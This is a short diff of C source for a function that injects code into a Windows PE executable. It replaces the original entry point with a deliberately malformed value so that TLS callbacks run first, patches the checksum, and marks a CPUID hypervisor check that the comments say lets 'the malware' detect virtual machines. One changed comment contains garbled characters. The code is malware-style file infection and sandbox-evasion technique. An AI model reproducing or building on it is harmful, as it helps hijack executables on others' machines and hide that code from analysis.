@@ -150,10 +150,10 @@ bool AddCode(char *filepath)
 	////////Save the oldEntryPoint
 	DWORD OEP = nt->OptionalHeader.AddressOfEntryPoint + nt->OptionalHeader.ImageBase;
 	printf("Original Entry Point is: %08x\n", OEP);
-	nt->OptionalHeader.AddressOfEntryPoint = 0x0acab666; //last->VirtualAddress;
+	nt->OptionalHeader.AddressOfEntryPoint = 0x0acab666; 
 	// this is an intended malformation theoretically when AddressOfEntryPoint equ 0x00000000
 	//execution starts in the DOS header but we have TLS Callbacks in place 
-	//alternatively set AddressOfEntryPoint = last->VirtualAddress; i dont think really matters!!!    
+	//alternatively set AddressOfEntryPoint = last->VirtualAddress; it dosen't really matters you can put any value!!!    
 	printf("New Entry Point is: %08x\n", nt->OptionalHeader.AddressOfEntryPoint);
 	//precomputed checksum 
 	nt->OptionalHeader.CheckSum = 0x000c3e32;
@@ -996,7 +996,7 @@ bool AddCode(char *filepath)
 	
 	
 	////////////CPUID2
-	//Hypervisor brand”: by calling CPUID with EAX=40000000 as input,1 the malware will get, as the return value,
+	//Hypervisor brandÂ”: by calling CPUID with EAX=40000000 as input,1 the malware will get, as the return value,
 	//the virtualization vendor string in EBX, ECX, EDX.
 	
 		cpu_id2:
